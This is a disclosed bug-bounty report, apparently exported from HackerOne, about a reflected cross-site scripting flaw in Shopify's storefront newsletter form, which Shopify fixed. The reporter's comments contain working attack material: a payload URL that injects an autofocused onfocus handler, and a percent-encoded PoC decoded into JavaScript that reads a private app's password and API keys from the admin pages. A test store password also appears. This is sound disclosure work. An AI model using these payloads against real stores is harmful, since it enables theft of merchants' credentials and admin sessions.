{"id":709336,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MDkzMzY=","url":"https://hackerone.com/reports/709336","title":"Reflective Cross-site Scripting via Newsletter Form","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-10-08T02:36:01.197Z","submitted_at":"2019-10-08T02:36:01.197Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dostoevskylabs","url":"/dostoevskylabs","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-10-11T17:38:59.054Z","bug_reporter_agreed_on_going_public_at":"2019-10-11T17:38:58.998Z","team_member_agreed_on_going_public_at":"2019-10-11T17:32:33.225Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"*.myshopify.com is vulnerable to a reflective cross-site scripting attack in the newsletter form. This can be crafted to trigger on a page load without any further user interaction.\n\nThe following example url shows this vulnerability:\n```\nhttps://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a\u0026form_type[a]aaa\n```\n\nThis was tested on a newly registered store \"testbuguser.myshopify.com\"\n\nIf you require any additional details, please do not hesitate to bump.\n\n## Impact\n\nThis attack could be leveraged to compromise administrative sessions or perform actions on behalf of users with the same level of privilege as the user.","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":602020,"file_name":"proof.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ZU4SttyYnr13S3uppRu8mL62?response-content-disposition=attachment%3B%20filename%3D%22proof.png%22%3B%20filename%2A%3DUTF-8%27%27proof.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8c108db177a318960ee822383d2330ec74d3f2b92b0b3f90d8bc8432d5199617","file_size":57151,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":71,"voters":["drsniper","secator","th4nu_0x0","sameerphad72","spam404","prophet","enixium","macasun","aryan2808","sudi","and 61 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5981791,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"the password to the store is: fohclo","automated_response":false,"created_at":"2019-10-08T02:40:33.294Z","updated_at":"2019-10-08T02:40:33.294Z","actor":{"username":"dostoevskylabs","cleared":false,"url":"/dostoevskylabs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5981858,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The following shows how the HTML is constructed, it appears to be a side-effect of RoR mass assignment (turning the values into { \"key\" =\u003e \"value\" } which in turn results in unescaped quotes.\n\n```html\n                      \u003cinput type=\"email\"\n                        name=\"contact[email]\"\n                        id=\"ContactFooter-email\"\n                        class=\"input-group__field newsletter__input input--error\"\n                        value=\"{\" onfocus=javascript:alert(\u0026#39;xss\u0026#39;) autofocus a\"=\u003e\"a\"}\"\n                        placeholder=\"Email address\"\n                        aria-label=\"Email address\"\n                        aria-required=\"true\"\n                        required\n                        autocorrect=\"off\"\n                        autocapitalize=\"off\"\n                        \n                          aria-invalid=\"true\"\n                          aria-describedby=\"ContactFooter-email-error\"\n                          data-form-status\n                        \u003e\n```\n\nfollowing the form of { \" onfocus=javascript:alert('xss') autofocus a\" =\u003e \"a\" } which breaks out of the value field.","automated_response":false,"created_at":"2019-10-08T03:03:20.079Z","updated_at":"2019-10-08T03:03:20.079Z","actor":{"username":"dostoevskylabs","cleared":false,"url":"/dostoevskylabs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5982288,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The following PoC shows how this could be used to compromise administrative API keys in a private app:\n\n```https://bugbountyayo.myshopify.com/?contact[email] onfocus%3djavascript:%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%27%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%2b%64%61%74%61%2e%73%70%6c%69%74%28%27%68%72%65%66%3d%22%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%61%6c%65%72%74%28%64%61%74%61%2e%73%70%6c%69%74%28%27%69%64%3d%22%70%72%69%76%61%74%65%5f%61%70%70%5f%70%61%73%73%77%6f%72%64%22%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%76%61%6c%75%65%3d%22%27%29%2e%73%6c%69%63%65%28%31%29%2e%73%68%69%66%74%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%29%7d%29%29%7d%29%7d%29%29%7d%29 autofocus a=a\u0026form_type[a]aaa```\n\nWhich decodes to this (as a one-liner with no spaces, formmating for ease of reading, kind of.. lol):\n```javascript\n// make request to private apps to get the ID of a private app\nfetch('/admin/apps/private', { headers:{'X-Shopify-Web':1} })\n  .then(function(data){\n      console.log(data.text().then(function(data){\n          // make a request to the private app we grabbed an id for\n          fetch('/admin/apps/private/'+data.split('href=\"/admin/apps/private/').pop().split('\"').shift(), { headers:{'X-Shopify-Web':1} })\n             .then(function(data){\n                 // parse out the password for this app (also able to parse api keys)\n                 console.log(data.text().then(function(data{\n    alert(data.split('id=\"private_app_password\"').pop().split('value=\"').slice(1).shift().split('\"').shift())\n}))})}))})\n```\n\nPoC screenshots included","automated_response":false,"created_at":"2019-10-08T06:08:31.563Z","updated_at":"2019-10-08T06:08:31.563Z","actor":{"username":"dostoevskylabs","cleared":false,"url":"/dostoevskylabs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":602197,"filename":"poc-2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GRfMkv7hcYWQN3Nanun857Sy?response-content-disposition=attachment%3B%20filename%3D%22poc-2.png%22%3B%20filename%2A%3DUTF-8%27%27poc-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=aff6272a52eea63d31113025f44f1e29fb7e260e38c39575e309b9b756130d03"},{"id":602196,"filename":"poc-1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aSXuTMZAnZaDs8YTHvqpBb8L?response-content-disposition=attachment%3B%20filename%3D%22poc-1.png%22%3B%20filename%2A%3DUTF-8%27%27poc-1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c57c7b90e1087754cac129b40f8367f88015a36c129e1bd943fa496a4b58fac7"}],"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5989011,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Howdy @dostoevskylabs,\n\nThanks for the report.\n\nWe were able to reproduce your findings and have passed them on to our engineering team.","automated_response":false,"created_at":"2019-10-08T19:12:27.628Z","updated_at":"2019-10-08T19:12:27.628Z","actor":{"username":"zack_spotify","cleared":false,"url":"/zack_spotify","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5998011,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report. We're awarding an initial $500, and will award the remainder (if any) once the issue is resolved.","automated_response":false,"created_at":"2019-10-09T19:25:58.266Z","updated_at":"2019-10-09T19:25:58.266Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"dostoevskylabs","url":"/dostoevskylabs"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5998499,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! I was sure I accidentally reported to Spotify when I saw your username haha. Well played sir.","automated_response":false,"created_at":"2019-10-09T20:28:07.488Z","updated_at":"2019-10-09T20:28:07.488Z","actor":{"username":"dostoevskylabs","cleared":false,"url":"/dostoevskylabs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6017135,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We recently deployed a fix for this issue. Inputs to the newsletter for should now be correctly escaped.\n\nWe'll be in touch with you again soon regarding a final bounty amount.","automated_response":false,"created_at":"2019-10-11T17:07:00.913Z","updated_at":"2019-10-11T17:07:00.913Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dostoevskylabs","url":"/dostoevskylabs"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6017354,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you @clayton. I tested it again and all fixed. Thanks for your time!!","automated_response":false,"created_at":"2019-10-11T17:30:12.389Z","updated_at":"2019-10-11T17:30:12.389Z","actor":{"username":"dostoevskylabs","cleared":false,"url":"/dostoevskylabs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6017361,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks once again for the very interesting bypass of the sanitization we apply to storefront inputs. We're awarding an additional $1,500 to bring the total bounty amount to $2,000. This falls near the upper end of our reflected cross-site scripting category for Shopify Core.\n\nWe look forward to hearing from you again soon. Happy hacking!","automated_response":false,"created_at":"2019-10-11T17:31:09.008Z","updated_at":"2019-10-11T17:31:09.008Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"dostoevskylabs","url":"/dostoevskylabs"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6017372,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-10-11T17:32:33.251Z","updated_at":"2019-10-11T17:32:33.251Z","first_to_agree":true,"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6017416,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the amazingly fast response. Shopify is the best!","automated_response":false,"created_at":"2019-10-11T17:38:59.017Z","updated_at":"2019-10-11T17:38:59.017Z","actor":{"username":"dostoevskylabs","cleared":false,"url":"/dostoevskylabs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6017417,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-10-11T17:38:59.074Z","updated_at":"2019-10-11T17:38:59.074Z","actor":{"username":"dostoevskylabs","cleared":false,"url":"/dostoevskylabs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":18423,"category":"researcher","content":"This is a reflective cross-site scripting in the newsletter signup feature of *.myshopify.com websites. It involves a filter bypass by using Ruby-on-Rails mass assignment to insert quotes (\") which are not user supplied and therefore are not being filtered by the application.\n\nThis allows escaping the value attribute on an input tag to add an onfocus attribute which contains javascript and finishing it off with an autofocus to trigger the event on page load.\n\nExtra spaces and square brackets \"[]\" were causing the payload to fail which made it difficult to retrieve sensitive data from requests to the admin panel. This was circumvented by using \"split\", \"slice\", \"pop\" and \"shift\" to move around the response data to grab administrative API keys from the /admin/apps endpoint.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":208898,"username":"dostoevskylabs","name":"Elijah","bio":"","cleared":false,"website":null,"location":"","created_at":"2017-10-18T04:29:45.043Z","url":"https://hackerone.com/dostoevskylabs","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}}]}